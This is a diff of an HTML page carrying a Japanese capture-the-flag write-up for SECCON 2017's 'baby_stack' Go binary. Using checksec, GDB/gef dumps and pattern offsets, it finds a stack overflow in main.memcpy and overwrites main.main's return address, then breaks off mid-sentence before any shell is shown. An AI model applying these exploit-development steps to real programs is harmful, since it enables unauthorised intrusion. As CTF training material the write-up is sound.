@@ -43,88 +43,90 @@
     </header>
     <div class="content__body">
         
-<div id="outline-container-headline-1" class="outline-3">
 <h3 id="headline-1">
 問題
 </h3>
-<div id="outline-text-headline-1" class="outline-text-3">
-<div id="outline-container-headline-2" class="outline-4">
 <h4 id="headline-2">
 問題文
 </h4>
-<div id="outline-text-headline-2" class="outline-text-4">
 <pre class="example">
 Can you do a traditional stack attack?
 </pre>
-</div>
-</div>
-<div id="outline-container-headline-3" class="outline-4">
 <h4 id="headline-3">
 配布ファイル
 </h4>
-<div id="outline-text-headline-3" class="outline-text-4">
 <ul>
-<li><code>baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8</code></li>
+<li>
+<p>
+<code>baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8</code>
+</p>
+</li>
 </ul>
 <pre class="example">
 mc4nf@mc4nf:~/ctf/seccon2017/baby_stack$ file baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8 
 baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, Go BuildID=bcdb5e02c0606a4c9dd06d1e0dc56dc8564db722, with debug_info, not stripped
 
 mc4nf@mc4nf:~/ctf/seccon2017/baby_stack$ checksec baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8
-[*] &#39;/home/mc4nf/ctf/seccon2017/baby_stack/baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8&#39;
+[*] '/home/mc4nf/ctf/seccon2017/baby_stack/baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8'
     Arch:     amd64-64-little
     RELRO:    No RELRO
     Stack:    No canary found
     NX:       NX enabled
     PIE:      No PIE (0x400000)
 </pre>
-<p>実行ファイルに <code>file</code> コマンドと <code>checksec</code> を用いると、
+<p>
+実行ファイルに <code>file</code> コマンドと <code>checksec</code> を用いると、
 実行ファイルのアーキテクチャはx86-64、
-セキュリティ機構は、RELRO、SSP (Stack Smashing Protection)、PIEが無効で、NXのみ有効であることがわかる。</p>
-</div>
-</div>
-</div>
-</div>
-<div id="outline-container-headline-4" class="outline-3">
+セキュリティ機構は、RELRO、SSP (Stack Smashing Protection)、PIEが無効で、NXのみ有効であることがわかる。
+</p>
 <h3 id="headline-4">
 方針
 </h3>
-<div id="outline-text-headline-4" class="outline-text-3">
-<p>この問題では、実行ファイルのみ配布され、問題のソースコードが配布されていない。
-このため、問題を解くために以下の手順で脆弱性の調査を行う。</p>
+<p>
+この問題では、実行ファイルのみ配布され、問題のソースコードが配布されていない。
+このため、問題を解くために以下の手順で脆弱性の調査を行う。
+</p>
 <ol>
-<li>配布された実行ファイルを動作させ、プログラムの脆弱性を特定</li>
-<li>特定した脆弱性を利用してシェルの起動</li>
+<li>
+<p>
+配布された実行ファイルを動作させ、プログラムの脆弱性を特定
+</p>
+</li>
+<li>
+<p>
+特定した脆弱性を利用してシェルの起動
+</p>
+</li>
 </ol>
-</div>
-</div>
-<div id="outline-container-headline-5" class="outline-3">
 <h3 id="headline-5">
 1. 配布された実行ファイルの脆弱性の特定
 </h3>
-<div id="outline-text-headline-5" class="outline-text-3">
-<div id="outline-container-headline-6" class="outline-4">
 <h4 id="headline-6">
+<span class="todo">TODO</span>
 実行ファイルの動作の確認   
 </h4>
-<div id="outline-text-headline-6" class="outline-text-4">
-<p>とりあえず、配布された実行ファイルの動作がわからない限り何もわからないので、早速実行してみる。</p>
+<p>
+とりあえず、配布された実行ファイルの動作がわからない限り何もわからないので、早速実行してみる。
+</p>
 <pre class="example">
 mc4nf@mc4nf:~/ctf/seccon2017/baby_stack$ ./baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8 
-Please tell me your name &gt;&gt; hoge
-Give me your message &gt;&gt; fuga
+Please tell me your name >> hoge
+Give me your message >> fuga
 Thank you, hoge!
 msg : fuga
 </pre>
-<p>実行してみると、 <code>Please tell me your name &gt;&gt;</code> の文字列の表示の後に1回目の入力(ここでは <code>hoge</code> を入力)、
-   <code>Give me your message &gt;&gt;</code> の文字列の表示の後に2回目の入力(ここでは <code>fuga</code> を入力)を促された。
-   また、2回の入力が終わると、それぞれ入力した文字列が画面上に表示され、プログラムが終了した。</p>
 <p>
-   問題のタイトルや、実行ファイルに対しSSPが適用されていないことなどから、大量の文字を入力し、スタックバッファオーバフローの脆弱性が存在しているか確認してみる。</p>
+実行してみると、 <code>Please tell me your name &gt;&gt;</code> の文字列の表示の後に1回目の入力(ここでは <code>hoge</code> を入力)、
+   <code>Give me your message &gt;&gt;</code> の文字列の表示の後に2回目の入力(ここでは <code>fuga</code> を入力)を促された。
+   また、2回の入力が終わると、それぞれ入力した文字列が画面上に表示され、プログラムが終了した。
+</p>
+<p>
+   問題のタイトルや、実行ファイルに対しSSPが適用されていないことなどから、大量の文字を入力し、スタックバッファオーバフローの脆弱性が存在しているか確認してみる。
+</p>
 <pre class="example">
 mc4nf@mc4nf:~/ctf/seccon2017/baby_stack$ ./baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8 
-Please tell me your name &gt;&gt; aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
-Give me your message &gt;&gt; bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb   
+Please tell me your name >> aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+Give me your message >> bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb   
 panic: runtime error: growslice: cap out of range
 
 goroutine 1 [running]:
@@ -149,23 +151,23 @@ main.main()
 </pre>
 <p>
    とりあえず、何も考えずに大量の文字列を入力したところ、プログラムがエラーを出力し終了した。
-   ここで、出力されたエラーを見てみると、 <code>0x6262626262626262</code> のような記述が多く見られる。
+   ここで、出力されたエラーを見てみると、 <code>fmt.(*pp).fmtString</code> などの引数に  <code>0x62626...62</code> がよく表われる。
    <code>0x62</code> はASCIIコードで <code>&#39;b&#39;</code> を表わすことから、2回目の入力においてスタックバッファオーバフローが発生していると予想できる。
-   また、ここでエラーコードから、問題のプログラムはGo言語で書かれていたこともわかる。</p>
-</div>
-</div>
-<div id="outline-container-headline-7" class="outline-4">
+   また、ここでエラーコードに <code>back_stack.go</code> や <code>goroutine 1</code> という文字列があることから、問題のプログラムはGo言語で書かれていたこともわかる。
+</p>
 <h4 id="headline-7">
 GDBを用いた動的解析
 </h4>
-<div id="outline-text-headline-7" class="outline-text-4">
-<p>それでは、だいたいの実行ファイルの動きと脆弱性の存在する箇所の検討がついたことから、GDBを用いて実行ファイルの動きを追ってみる。</p>
 <p>
-    まず、2回目の入力が促されたタイミングでプログラムを停止し、関数の呼び出し履歴を確認してみる。</p>
+それでは、だいたいの実行ファイルの動きと脆弱性の存在する箇所の検討がついたことから、GDBを用いて実行ファイルの動きを追ってみる。
+</p>
+<p>
+    まず、2回目の入力が促されたタイミングでプログラムを停止し、関数の呼び出し履歴を確認してみる。
+</p>
 <pre class="example">
 [#0] 0x496a54 → syscall.Syscall()
 [#1] 0x4957af → syscall.read(fd=0x0, p={
-array = 0xc820094005 &#34;&#34;,
+array = 0xc820094005 "",
 len = 0xffb,
 cap = 0xffb
 }, n=0xc82001ea0c, err={
@@ -173,7 +175,7 @@ tab = 0x0,
 data = 0x0
 })
 [#2] 0x49529d → syscall.Read(fd=0x0, p={
-array = 0xc820094005 &#34;&#34;,
+array = 0xc820094005 "",
 len = 0xffb,
 cap = 0xffb
 }, n=0xc820000180, err={
@@ -181,7 +183,7 @@ tab = 0x0,
 data = 0x0
 })
 [#3] 0x46aa23 → os.(*File).read(f=0xc820034008, b={
-array = 0xc820094005 &#34;&#34;,
+array = 0xc820094005 "",
 len = 0xffb,
 cap = 0xffb
 }, n=0x18, err={
@@ -189,7 +191,7 @@ tab = 0x0,
 data = 0x0
 })
 [#4] 0x46887a → os.(*File).Read(f=0xc820034008, b={
-array = 0xc820094005 &#34;&#34;,
+array = 0xc820094005 "",
 len = 0xffb,
 cap = 0xffb
 }, n=0x4ebb40, err={
@@ -201,80 +203,90 @@ data = 0x0
 </pre>
 <p>
     すると、2回目の入力を行う関数は、 <code>main.main()</code> の <code>0x4011e8</code> の直前に呼ばれていたことがわかる。
-    そこで、 <code>main.main()</code> の <code>0x4011e8</code> から先で呼ばれる処理の中で、スタックバッファオーバフローを引き起こすような処理がないか確認してみる。</p>
+    そこで、 <code>main.main()</code> の <code>0x4011e8</code> から先で呼ばれる処理の中で、スタックバッファオーバフローを引き起こすような処理がないか確認してみる。
+</p>
 <p>
-    すると、 <code>0x40129f</code> において、 <code>main.memcpy</code> という関数が呼ばれていることがわかる。</p>
+    すると、 <code>0x40129f</code> において、 <code>main.memcpy</code> という関数が呼ばれていることがわかる。
+</p>
 <pre class="example">
 ...    
-0x40129f &lt;main.main+671&gt;:    call   0x4014f0 &lt;main.memcpy&gt;
+0x40129f <main.main+671>:    call   0x4014f0 <main.memcpy>
 ...
 </pre>
-<p>いかにもメモリコピーを担当していそうな関数名であるため、この関数について調べてみる。</p>
 <p>
-    まず、 <code>main.memcpy</code> が呼び出されたときのスタックの状態を確認してみる。</p>
+<code>memcpy</code> は、入力された文字列を別のメモリ領域にコピーする処理を実装しているので、
+     この関数の呼び出し方法に起因して、スタックバッファオーバフローが発生していると推測できる。
+     そこで、この関数の呼び出しについて調べてみる。
+</p>
+<p>
+    まず、 <code>main.memcpy</code> が呼び出されたときのスタックの状態を確認してみる。
+</p>
 <pre class="example">
 gef➤  dereference
-0x000000c820051d48│+0x0000: 0x00000000004012a4  →  &lt;main.main+676&gt; mov rbx, QWORD PTR [rsp+0xc8]   ← $rsp
+0x000000c820051d48│+0x0000: 0x00000000004012a4  →  <main.main+676> mov rbx, QWORD PTR [rsp+0xc8]   ← $rsp
 0x000000c820051d50│+0x0008: 0x000000c820051db0  →  0x0000000000000000
-0x000000c820051d58│+0x0010: 0x000000c820051d90  →  &#34;aaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#34;
+0x000000c820051d58│+0x0010: 0x000000c820051d90  →  "aaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
 0x000000c820051d60│+0x0018: 0x000000000000001d
 0x000000c820051d68│+0x0020: 0x0000000000000ffb
-0x000000c820051d70│+0x0028: 0x000000c820051d90  →  &#34;aaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#34;
+0x000000c820051d70│+0x0028: 0x000000c820051d90  →  "aaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
 0x000000c820051d78│+0x0030: 0x000000000000001d
 0x000000c820051d80│+0x0038: 0x0000000000000000
 0x000000c820051d88│+0x0040: 0x0000000000000000
-0x000000c820051d90│+0x0048: &#34;aaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#34;      ← $rcx, $rbp, $rdi
+0x000000c820051d90│+0x0048: "aaaaaaaaaaaaaaaaaaaaaaaaaaaaa"      ← $rcx, $rbp, $rdi
 gef➤
-0x000000c820051d98│+0x0050: &#34;aaaaaaaaaaaaaaaaaaaaa&#34;
-0x000000c820051da0│+0x0058: &#34;aaaaaaaaaaaaa&#34;
-0x000000c820051da8│+0x0060: 0x0000006161616161 (&#34;aaaaa&#34;?)
-0x000000c820051db0│+0x0068: 0x0000000000000000 &lt;-ここから0x20バイトは空の領域が確保されている
+0x000000c820051d98│+0x0050: "aaaaaaaaaaaaaaaaaaaaa"
+0x000000c820051da0│+0x0058: "aaaaaaaaaaaaa"
+0x000000c820051da8│+0x0060: 0x0000006161616161 ("aaaaa"?)
+0x000000c820051db0│+0x0068: 0x0000000000000000 <-ここから0x20バイトは空の領域が確保されている
 0x000000c820051db8│+0x0070: 0x0000000000000000
 0x000000c820051dc0│+0x0078: 0x0000000000000000
-0x000000c820051dc8│+0x0080: 0x0000000000000000 &lt;- ここまで
+0x000000c820051dc8│+0x0080: 0x0000000000000000 <- ここまで
 0x000000c820051dd0│+0x0088: 0x000000c820051ec8  →  0x00007ffff7f6d1c0  →  0x00000000004dfc00  →  0x0000000000000010
-0x000000c820051dd8│+0x0090: 0x000000c8200a2000  →  0x0000000065676f68 (&#34;hoge&#34;?)
+0x000000c820051dd8│+0x0090: 0x000000c8200a2000  →  0x0000000065676f68 ("hoge"?)
 0x000000c820051de0│+0x0098: 0x0000000000000004
 </pre>
 <p>
-     <code>&#34;aaaa...&#34;</code> を入力し、 <code>main.memcpy</code> の処理が終了した後のスタックの状態も確認する。</p>
+     <code>&#34;aaaa...&#34;</code> を入力し、 <code>main.memcpy</code> の処理が終了した後のスタックの状態も確認する。
+</p>
 <pre class="example">
 gef➤  dereference
-0x000000c820051d50│+0x0000: 0x000000c820051db0  →  &#34;aaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#34;       ← $rsp
-0x000000c820051d58│+0x0008: 0x000000c820051d90  →  &#34;aaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#34;
+0x000000c820051d50│+0x0000: 0x000000c820051db0  →  "aaaaaaaaaaaaaaaaaaaaaaaaaaaaa"       ← $rsp
+0x000000c820051d58│+0x0008: 0x000000c820051d90  →  "aaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
 0x000000c820051d60│+0x0010: 0x000000000000001d
 0x000000c820051d68│+0x0018: 0x0000000000000ffb
-0x000000c820051d70│+0x0020: 0x000000c820051d90  →  &#34;aaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#34;
+0x000000c820051d70│+0x0020: 0x000000c820051d90  →  "aaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
 0x000000c820051d78│+0x0028: 0x000000000000001d
 0x000000c820051d80│+0x0030: 0x0000000000000000
 0x000000c820051d88│+0x0038: 0x0000000000000000
-0x000000c820051d90│+0x0040: &#34;aaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#34;      ← $rbp, $rdi
-0x000000c820051d98│+0x0048: &#34;aaaaaaaaaaaaaaaaaaaaa&#34;
+0x000000c820051d90│+0x0040: "aaaaaaaaaaaaaaaaaaaaaaaaaaaaa"      ← $rbp, $rdi
+0x000000c820051d98│+0x0048: "aaaaaaaaaaaaaaaaaaaaa"
 gef➤
-0x000000c820051da0│+0x0050: &#34;aaaaaaaaaaaaa&#34;
-0x000000c820051da8│+0x0058: 0x0000006161616161 (&#34;aaaaa&#34;?)
-0x000000c820051db0│+0x0060: &#34;aaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#34; &lt;- 空だった領域に文字列がコピー
-0x000000c820051db8│+0x0068: &#34;aaaaaaaaaaaaaaaaaaaaa&#34;
-0x000000c820051dc0│+0x0070: &#34;aaaaaaaaaaaaa&#34;
-0x000000c820051dc8│+0x0078: 0x0000006161616161 (&#34;aaaaa&#34;?)  &lt;- ここまで
+0x000000c820051da0│+0x0050: "aaaaaaaaaaaaa"
+0x000000c820051da8│+0x0058: 0x0000006161616161 ("aaaaa"?)
+0x000000c820051db0│+0x0060: "aaaaaaaaaaaaaaaaaaaaaaaaaaaaa" <- 空だった領域に文字列がコピー
+0x000000c820051db8│+0x0068: "aaaaaaaaaaaaaaaaaaaaa"
+0x000000c820051dc0│+0x0070: "aaaaaaaaaaaaa"
+0x000000c820051dc8│+0x0078: 0x0000006161616161 ("aaaaa"?)  <- ここまで
 0x000000c820051dd0│+0x0080: 0x000000c820051ec8  →  0x00007ffff7f6d1c0  →  0x00000000004dfc00  →  0x0000000000000010
-0x000000c820051dd8│+0x0088: 0x000000c8200a2000  →  0x0000000065676f68 (&#34;hoge&#34;?)
+0x000000c820051dd8│+0x0088: 0x000000c8200a2000  →  0x0000000065676f68 ("hoge"?)
 0x000000c820051de0│+0x0090: 0x0000000000000004
-0x000000c820051de8│+0x0098: 0x000000c820051d90  →  &#34;aaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#34;
+0x000000c820051de8│+0x0098: 0x000000c820051d90  →  "aaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
 </pre>
 <p>
      この2つのスタックの状態を確認してみると、 <code>main.memcpy</code> 呼び出し前は <code>0x000000c820051db0</code> から <code>0x20</code> バイトの領域は <code>0</code> であったものの、
-     呼び出し後には、 <code>&#34;aaaa...&#34;</code> がコピーされていることがわかる。</p>
+     呼び出し後には、 <code>&#34;aaaa...&#34;</code> がコピーされていることがわかる。
+</p>
 <p>
      このことから、 <code>main.memcpy</code> によって2回目に入力した文字列がコピーされる領域は、 <code>0x20</code> バイト確保されていることがわかる。     
-     ここで、 <code>0x20</code> バイト以上の長さの文字列を入力してみると、本来用意されていたコピー先の領域を超えて、スタックバッファオーバフローが発生することを確認できる。</p>
+     ここで、 <code>0x20</code> バイト以上の長さの文字列を入力してみると、本来用意されていたコピー先の領域を超えて、スタックバッファオーバフローが発生することを確認できる。
+</p>
 <pre class="example">
 ...     
 0x000000c820051db0│+0x0060: 0x6161616161616161
 0x000000c820051db8│+0x0068: 0x6161616161616161
 0x000000c820051dc0│+0x0070: 0x6161616161616161
 0x000000c820051dc8│+0x0078: 0x6161616161616161 
-0x000000c820051dd0│+0x0080: 0x6161616161616161 &lt;- スタックバッファオーバフローが発生
+0x000000c820051dd0│+0x0080: 0x6161616161616161 <- スタックバッファオーバフローが発生
 0x000000c820051dd8│+0x0088: 0x6161616161616161
 0x000000c820051de0│+0x0090: 0x0000000000000005   ← $rdx
 0x000000c820051de8│+0x0098: 0x000000c820012180  →  0x6161616161616161
@@ -282,56 +294,57 @@ gef➤
 </pre>
 <p>
      ここまでの調査で、2回目の入力において、 <code>main.memcpy</code> 内でスタックバッファオーバフローが発生することが特定できた。
-     次に、この脆弱性を用いてどのようにしてシェルを起動するか考えていく。</p>
-</div>
-</div>
-</div>
-</div>
-<div id="outline-container-headline-8" class="outline-3">
+     次に、この脆弱性を用いてどのようにしてシェルを起動するか考えていく。
+</p>
 <h3 id="headline-8">
 2. 脆弱性を利用したシェルの起動
 </h3>
-<div id="outline-text-headline-8" class="outline-text-3">
-<div id="outline-container-headline-9" class="outline-4">
 <h4 id="headline-9">
 RIPの奪取   
 </h4>
-<div id="outline-text-headline-9" class="outline-text-4">
-<p>まず、シェルを起動するために、RIPを奪う必要がある。
-    また、配布された実行プログラムは、事前調査からSSPが無効なことがわかっている。
-    そこで、先程見つけたスタックバッファオーバフローの脆弱性を用いて <code>main.main</code> のリターンアドレスを書き換えられないかを調査してみる。</p>
 <p>
-    まず、 <code>main.main</code> のリターンアドレスがスタックのどこに格納されているのかわからないため、 <code>main.main</code> が呼び出し直後のスタックの状態を確認してみる。</p>
+まず、シェルを起動するために、RIPを奪う必要がある。
+    また、配布された実行プログラムは、事前調査からSSPが無効なことがわかっている。
+    そこで、先程見つけたスタックバッファオーバフローの脆弱性を用いて <code>main.main</code> のリターンアドレスを書き換えられないかを調査してみる。
+</p>
+<p>
+    まず、 <code>main.main</code> のリターンアドレスがスタックのどこに格納されているのかわからないため、 <code>main.main</code> が呼び出し直後のスタックの状態を確認してみる。
+</p>
 <pre class="example">
 gef➤  dereference
-0x000000c820051f48│+0x0000: 0x0000000000429ef0  →  &lt;runtime.main+688&gt; mov ebx, DWORD PTR [rip+0x1903c2]        # 0x5ba2b8 &lt;runtime.panicking&gt;      ← $rsp
+0x000000c820051f48│+0x0000: 0x0000000000429ef0  →  <runtime.main+688> mov ebx, DWORD PTR [rip+0x1903c2]        # 0x5ba2b8 <runtime.panicking>      ← $rsp
 ...
 </pre>
-<p>すると、スタックの先頭に、 <code>main.main</code> のリターンアドレスが積まれていることを確認できる。</p>
+<p>
+すると、スタックの先頭に、 <code>main.main</code> のリターンアドレスが積まれていることを確認できる。
+</p>
 <p>
 次に、このリターンアドレスを書き換えるために、オーバフローが発生する領域からリターンアドレスまでのオフセットを計算する。
 前節から、スタックの <code>0x000000c820051db0</code> から入力文字列が格納されることがわかっている。
 このため、これらの差分を計算すると、 <code>0x198</code> バイトであることがわかる。
-これより、 <code>0x198</code> バイトの文字列を入力し、その後にアドレスを格納することで、リターンアドレスを書き換えることができると考えられる。</p>
+これより、 <code>0x198</code> バイトの文字列を入力し、その後にアドレスを格納することで、リターンアドレスを書き換えることができると考えられる。
+</p>
 <p>
 そこで、早速 <code>0x198</code> バイトの文字列 + <code>8</code> バイトの文字列(リターンアドレス)を入力し、GDBで先程リターンアドレスが格納されていたアドレスを確認してみる。
-1行目では、 <code>main.memcpy</code> 呼び出し後のアドレス ( <code>0x4012a4</code> )にブレークポイントを打っている。</p>
+1行目では、 <code>main.memcpy</code> 呼び出し後のアドレス ( <code>0x4012a4</code> )にブレークポイントを打っている。
+</p>
 <pre class="example">
 gef➤  b *0x4012a4
 gef➤  g
-Please tell me your name &gt;&gt; hoge
-Give me your message &gt;&gt; aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbb
+Please tell me your name >> hoge
+Give me your message >> aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbb
 gef➤  dereference
 ...
-0x000000c820051f30│+0x01e0: &#34;aaaaaaaaaaaaaaaaaaaaaaaabbbb&#34;
-0x000000c820051f38│+0x01e8: &#34;aaaaaaaaaaaaaaaabbbb&#34;
-0x000000c820051f40│+0x01f0: &#34;aaaaaaaabbbb&#34;
-0x000000c820051f48│+0x01f8: 0x0000000062626262 (&#34;bbbb&#34;?)
+0x000000c820051f30│+0x01e0: "aaaaaaaaaaaaaaaaaaaaaaaabbbb"
+0x000000c820051f38│+0x01e8: "aaaaaaaaaaaaaaaabbbb"
+0x000000c820051f40│+0x01f0: "aaaaaaaabbbb"
+0x000000c820051f48│+0x01f8: 0x0000000062626262 ("bbbb"?)
 ...
 </pre>
 <p>
 実行結果を見てみると、先程リターンアドレスが格納されていた <code>0x000000c820051f48</code> の内容を <code>0x62626262</code> ( <code>bbbb</code> )に書き換えできていることがわかる。
-しかし、 <code>main.main</code> のリターンアドレスへジャンプする前に、プログラムが以下のようなエラーを出力し終了してしまう。</p>
+しかし、 <code>main.main</code> のリターンアドレスへジャンプする前に、プログラムが以下のようなエラーを出力し終了してしまう。
+</p>
 <pre class="example">
 runtime: out of memory: cannot allocate 7016996765293477888-byte block (1048576 in use)
 fatal error: out of memory
@@ -355,26 +368,30 @@ main.main()
 [Inferior 1 (process 53719) exited with code 02]
 </pre>
 <p>
-そこで、次に、このエラーを回避する方法を考える。</p>
-</div>
-</div>
-<div id="outline-container-headline-10" class="outline-4">
+そこで、次に、このエラーを回避する方法を考える。
+</p>
 <h4 id="headline-10">
-エラーの回避
+エラーの回避    
 </h4>
-<div id="outline-text-headline-10" class="outline-text-4">
-<p>出力されたエラーの内容を確認しただけでは、スタックのどの領域がエラーの原因であるかわからない。
-    そこで、patternを利用し、エラー出力から原因となるスタックの領域を特定する。</p>
 <p>
-    まず、 <code>0x200</code> バイトのpatternを作成する。</p>
+出力されたエラーの内容を確認しただけでは、スタックのどの領域がエラーの原因であるかわからない。
+    そこで、patternを利用し、エラー出力から原因となるスタックの領域を特定する。
+</p>
+<p>
+    まず、 <code>0x200</code> バイトのpatternを作成する。
+</p>
 <pre class="example">
 gef➤  pattern create 0x200
 [+] Generating a pattern of 512 bytes (n=8)
 aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaaaaacnaaaaaac
-[+] Saved as &#39;$_gef0&#39;
+[+] Saved as '$_gef0'
 </pre>
 <p>
-     次に、このpatternを入力し、再度エラーを出力させる。</p>
+patternコマンドにより出力された文字列をプログラムへ入力すると、エラー出力中の値から入力した文字列の何バイト目が原因となっているか推測できる。    
+</p>
+<p>
+     次に、このpatternを入力し、再度エラーを出力させる。
+</p>
 <pre class="example">
 gef➤
 runtime: out of memory: cannot allocate 7089054359331405824-byte block (1048576 in use)
@@ -399,62 +416,73 @@ main.main()
 [Inferior 1 (process 38636) exited with code 02]
 </pre>
 <p>
-     上記のエラーを見てみると、 <code>0x6261616161616162~、~0x6261616161616163</code> 、 および <code>0x626161616161617a</code> のパターンの箇所が原因でエラーが発生していると考えられる。
-     そこで、これらのパターンのオフセットを求めてみる。</p>
+     上記のエラーを見てみると、 <code>runtime.slicebytetostring</code> の引数として、先程入力したパターンの一部である <code>0x6261616161616162~、~0x6261616161616163</code> 、
+     および <code>0x626161616161617a</code> がエラー出力中に表示されており、これが原因でエラーが発生していると考えられる。
+</p>
+<p>
+     そこで、これらのパターンのオフセットを求めてみる。
+</p>
 <pre class="example">
 gef➤  pattern search 0x6261616161616162
-[+] Searching for &#39;0x6261616161616162&#39;
+[+] Searching for '0x6261616161616162'
 [+] Found at offset 208 (little-endian search) likely
 [+] Found at offset 208 (big-endian search)
 gef➤  pattern search 0x6261616161616163
-[+] Searching for &#39;0x6261616161616163&#39;
+[+] Searching for '0x6261616161616163'
 [+] Found at offset 216 (little-endian search) likely
 [+] Found at offset 408 (big-endian search)
 gef➤  pattern search 0x626161616161617a
-[+] Searching for &#39;0x626161616161617a&#39;
+[+] Searching for '0x626161616161617a'
 [+] Found at offset 200 (little-endian search) likely
 </pre>
-<p>すると、これらのオフセットは208(0xd0)番目、216(0xd8)番目、200(0xc8)番目にあたることがわかる。</p>
 <p>
-     また、スタックバッファオーバフローが発生しない入力をした場合のスタックの状態を見ることで、何故ここでエラーが発生したのか考えてみる。</p>
+すると、これらのオフセットは208(0xd0)番目、216(0xd8)番目、200(0xc8)番目にあたることがわかる。
+</p>
+<p>
+     また、スタックバッファオーバフローが発生しない入力をした場合のスタックの状態を見ることで、何故ここでエラーが発生したのか考えてみる。
+</p>
 <pre class="example">
 gef➤  g
-Please tell me your name &gt;&gt; hoge
-Give me your message &gt;&gt; fuga
+Please tell me your name >> hoge
+Give me your message >> fuga
 gef➤ dereference
 ...
-0x000000c820051e78│+0x0128: 0x000000c820051db0  →  0x0000000061677566 (&#34;fuga&#34;?)
-0x000000c820051e80│+0x0130: 0x0000000000000020 (&#34; &#34;?)
-0x000000c820051e88│+0x0138: 0x0000000000000020 (&#34; &#34;?)
+0x000000c820051e78│+0x0128: 0x000000c820051db0  →  0x0000000061677566 ("fuga"?)
+0x000000c820051e80│+0x0130: 0x0000000000000020 (" "?)
+0x000000c820051e88│+0x0138: 0x0000000000000020 (" "?)
 ...
 </pre>
-<p>上記の入力を行い、 <code>main.memcpy</code> 終了後のスタックの状態を見てみると、
